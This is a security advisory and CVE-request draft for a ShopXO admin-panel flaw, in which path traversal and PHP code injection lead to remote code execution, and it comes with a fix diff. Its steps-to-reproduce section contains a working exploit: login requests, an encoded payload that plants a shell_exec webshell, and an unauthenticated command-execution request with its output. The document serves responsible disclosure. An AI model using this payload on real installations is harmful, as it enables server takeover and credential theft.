# ShopXO Admin Panel "Create Application" Unvalidated Parameters → Remote Code Execution

> **How to use this file**: §1 is the ready-to-paste advisory body (GitHub "Report a vulnerability" form or a CNA e-mail). §2 is the short CVE-request cover letter. §3 is the sanitised PoC. Replace nothing but your own contact/credit lines — all target-specific values are already placeholders (`<TARGET>`, `<ADMIN_ENTRY>`, …).

---

## §1 · Advisory body (English, ready to submit)

### Title

**ShopXO (admin panel) — unvalidated `plugins` / `name` parameters in "Create Application" lead to path traversal and PHP code injection, resulting in remote code execution**

### Affected product and versions

| Item | Value |
|---|---|
| Product | ShopXO (open-source B2C e-commerce system, ThinkPHP-based) |
| Vendor / author | ShopXO — <https://shopxo.net> (author: Devil / gong.gg) |
| Repositories | GitHub `gongfuxiang/shopxo` · Gitee `gongfuxiang/shopxo` |
| Affected versions | **≤ 6.9.2** — verified on **6.9.1 (Release 20260803)** and **6.9.2 (Release 20260928, latest at time of writing)** |
| Fixed version | **None known** (no fix identified as of 2026-10-09) |
| Vulnerable component | Admin application, application-management module (`Pluginsadmin`) |
| Attack prerequisites | A valid admin session. **Low-privilege admin is sufficient**: the single permission node `346` ("Application add/edit", `PluginsAdmin.Save`) is independent from node `348` (upload) / `374` (install) in the `sxo_power` table |
| Authentication required for exploitation of the planted file | **None** — the generated file is executed by direct HTTP request, outside the framework router |

### Vulnerability types (CWE)

- **CWE-22** — Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal")
- **CWE-94** — Improper Control of Generation of Code ("Code Injection")
- Resulting impact class: **CWE-78**-equivalent (Operating System Command Execution)

### CVSS v3.1

```
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H   →  9.1 (Critical)
```

Rationale: the vulnerable component is the administration interface, while the impact (arbitrary OS command execution, arbitrary file read/write on the host) escapes that scope (`S:C`); the attacker must hold an admin account (`PR:H`); no user interaction (`UI:N`) and no special conditions (`AC:L`) are required after that.

*If the assigning CNA prefers Scope:Unchanged, the same vector scores **7.2** (`…/S:U/…`); either rating is acceptable — the vector is what matters.*

A companion issue (the same endpoint has no CSRF protection and accepts state-changing `GET` requests, allowing a one-click trigger by an authenticated admin) can be scored as `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H = 9.6` and should be tracked as a **separate CVE**.

### Summary

ShopXO's admin panel provides a legitimate feature — *Application Management → Create Application* — which generates a PHP plug-in skeleton on disk. Two missing validations combine into remote code execution:

1. the application identifier (`plugins`) is concatenated into a filesystem path with no path validation, allowing `../` traversal so the generated directory lands inside the web root; and
2. the application name (`name`) is interpolated verbatim into a **single-line PHP comment** inside the generated file, and the global input filter (`htmlspecialchars`) does not strip newlines, so a newline breaks out of the comment and injects arbitrary PHP statements.

One authenticated request therefore plants a fully attacker-controlled `.php` file under the web root, which any unauthenticated user can then execute over HTTP — granting arbitrary PHP code execution and, on typical deployments, arbitrary OS command execution.

### Root cause (source references)

All line numbers refer to `app/service/PluginsAdminService.php` and are identical in 6.9.1 and 6.9.2 (the file differs between those releases only in an unrelated plug-in preamble check at `:1291-1307`).

```php
// :601  entry
public static function PluginsSave($params = [])
{
    ...
    // :35   the only "validation" for the identifier is a 3-element blacklist
    public static $plugins_exclude_verification = ['view', 'shopxo', 'www'];

    // :1008-1014
    public static function PluginsVerification($plugins)
    {
        if(in_array($plugins, self::$plugins_exclude_verification)) { return DataReturn(..., -1); }
        return DataReturn('check_success', 0);
    }

    // :675  PATH TRAVERSAL — no realpath() / prefix assertion
    $app_dir = APP_PATH.'plugins'.DS.$plugins;          // $plugins comes straight from the request

    // :714-731  PHP template built by interpolation
    $admin = <<<php
    <?php
    namespace app\plugins\\$plugins\admin;              // :716  $plugins injected into code position

    // {$params['name']} - 后台管理                       // :718  $name injected into a LINE COMMENT
    ...
    php;

    // :870  sink (web-root write); same family: :874 Hook.php, :906 index/Index.php
    file_put_contents($app_dir.DS.'admin'.DS.'Admin.php', $admin);
}
```

Why the injected code must be quote-free: the global request filter is

```php
// app/Request.php:15-17
class Request extends \think\Request
{
    protected $filter = ['htmlspecialchars'];   // encodes ' " < > & ; does NOT remove newlines
}
```

so strings inside the payload are built with `chr()` (see the PoC). Note this constraint applies only at **injection** time — the runtime parameter of the planted file (`?cmd=…`) never passes through ShopXO's filter.

### Steps to reproduce

Placeholders: `<TARGET>` = site base URL, `<ADMIN_ENTRY>` = the (randomised) admin entry file name, `<ADMIN_USER>` / `<ADMIN_PASSWORD>` = admin credentials, `pocdir` = the directory that will be created.

**0. Baseline — the file does not exist yet**

```http
GET /pocdir/admin/Admin.php HTTP/1.1
Host: <TARGET>

HTTP/1.1 404 Not Found
```

**1. Obtain an admin session**

```http
POST /<ADMIN_ENTRY>?s=/admin/login HTTP/1.1
Host: <TARGET>
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

type=username&accounts=<ADMIN_USER>&pwd=<ADMIN_PASSWORD>
```

**2. Plant the payload (the vulnerable request)**

```http
POST /<ADMIN_ENTRY>?s=/pluginsadmin/save HTTP/1.1
Host: <TARGET>
Cookie: PHPSESSID=<admin session>
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

plugins=x%3B%23%2F..%2F..%2F..%2Fpublic%2Fpocdir
&name=x%0Aecho%2090350131%3B%24k%3Dchr(99).chr(109).chr(100)%3B%24c%3Dissset(%24_GET%5B%24k%5D)%3F%24_GET%5B%24k%5D%3Achr(105).chr(100)%3Becho%20%40%5Cshell_exec(%24c.chr(32).chr(50).chr(62).chr(38).chr(49))%3B%0A%2F%2F
&logo=%2Fstatic%2Fupload%2Fx.png&author=a&author_url=http%3A%2F%2Fx.com
&version=1.0.0&desc=a&apply_terminal=pc&apply_version=1.0.0

HTTP/1.1 200 OK
{"msg":"操作成功","code":0,"data":""}
```

Decoded values of the two injected parameters:

```
plugins = x;#/../../../public/pocdir
          └┬┘ └─────┬─────┘
           │        └─ traversal: APP_PATH.'plugins'.DS.$plugins  →  <docroot>/pocdir
           └─ `;#` closes the generated `namespace …;` statement and comments out the rest of that line,
              otherwise the file would not be valid PHP (because of the `..` in the namespace)

name    = x
          echo 90350131;$k=chr(99).chr(109).chr(100);$c=isset($_GET[$k])?$_GET[$k]:chr(105).chr(100);echo @\shell_exec($c.chr(32).chr(50).chr(62).chr(38).chr(49));
          //
          └─ leading `x\n` escapes the single-line comment; trailing `\n//` swallows the template's
             remaining " - 后台管理" text so the file stays syntactically valid
```

**3. Resulting file on disk** (`<docroot>/pocdir/admin/Admin.php`; `<docroot>` is the `public/` sub-directory of the ShopXO installation)

```php
<?php
namespace app\plugins\x;#/../../../public/pocdir\admin;   // traversal + namespace closed/comment-out

// x
echo 90350131;$k=chr(99).chr(109).chr(100);$c=isset($_GET[$k])?$_GET[$k]:chr(105).chr(100);echo @\shell_exec($c.chr(32).chr(50).chr(62).chr(38).chr(49));
// - 后台管理
class Admin { public function index($params = []) { … } }
```

The same request also writes `pocdir/admin/Hook.php` (sink `:874`), which is equally executable.

**4. Execute — with no credentials at all**

```http
GET /pocdir/admin/Admin.php?cmd=id HTTP/1.1
Host: <TARGET>
(no Cookie header)

HTTP/1.1 200 OK
90350131uid=1001(www) gid=1001(www) groups=1001(www)
```

`90350131` is the marker emitted by the injected code; `uid=1001(www)` is the output of the real command. Both are produced by the **unauthenticated** request.

**5. One-command reproduction script** (parameterised, no hard-coded target):

```bash
python3 shopox-RCE.py -u http://<TARGET> --admin-entry <ADMIN_ENTRY> \
        -a <ADMIN_USER> -p <ADMIN_PASSWORD> --mode shell   # exit 0 == reproduced
```

### Impact

- **Unauthenticated remote command execution** on the web server account (verified: `uid=1001(www)`).
- **Arbitrary file read/write on the host.** Command execution runs through the OS shell and is therefore **not** constrained by PHP's `open_basedir` (verified by reading `/etc/passwd`, `/etc/hostname` and directories outside the site root, including the site's `config/database.php`, which contains the database credentials).
- **Persistence.** The planted file is a real `.php` file and does not depend on any framework state; it keeps working after the admin logs out.
- **Privilege-model bypass.** Because permission node `346` ("Application add/edit") is independent from node `348` (upload) / `374` (install) in the `sxo_power` table, a **low-privilege administrator granted only node 346 can obtain code execution** — bypassing the intended separation between "editing application metadata" and "deploying code".
- **Evidence of environment hardening is not a mitigation.** If the host blocks `system` / `exec` / `shell_exec` via `disable_functions`, the attacker still obtains **arbitrary PHP code execution** (equivalent to arbitrary file read/write, database access, session forgery, and dropping a webshell).
- **Chaining.** Combined with the missing CSRF protection on the same endpoint, an unauthenticated attacker only needs to lure a logged-in administrator into clicking a single link (`GET`-based, see the companion issue) to achieve the same RCE.

### Remediation

```diff
--- a/app/service/PluginsAdminService.php
+++ b/app/service/PluginsAdminService.php
@@ 668-675  PluginsSave()
     $plugins = trim($params['plugins']);
+    // (1) strict allow-list for the identifier — kills '/', '\', '.', ';', '#' and any traversal
+    if(!preg_match('/^[a-z][a-z0-9_]{1,31}$/', $plugins))
+    {
+        return DataReturn(MyLang('common_service.pluginsadmin.app_name_error_tips'), -1);
+    }
     $app_dir = APP_PATH.'plugins'.DS.$plugins;
+    // (2) normalise and assert the target directory stays inside the plug-in root
+    //     (same pattern already used correctly elsewhere in this code base:
+    //      app/service/FormInputService.php:812-817)
+    $base = realpath(APP_PATH.'plugins').DIRECTORY_SEPARATOR;
+    $real = realpath($app_dir);
+    if($real === false || strncmp($real, $base, strlen($base)) !== 0)
+    {
+        return DataReturn(MyLang('common_service.pluginsadmin.app_name_error_tips'), -1);
+    }

@@ 714-718  generated PHP template
-$admin=<<<php
-<?php
-namespace app\plugins\\$plugins\admin;
-
-// {$params['name']} - 后台管理
+// (3) never interpolate raw request data into generated code — export it
+$plugins_export = var_export($plugins, true);
+// (4) strip newlines / control characters from free-text fields
+$name_export    = var_export(preg_replace('/[\r\n\x00-\x1f]+/', '', (string)$params['name']), true);
+$admin=<<<php
+<?php
+namespace app\plugins\\{$plugins_export}\admin;
+
+// {$name_export} - 后台管理
```

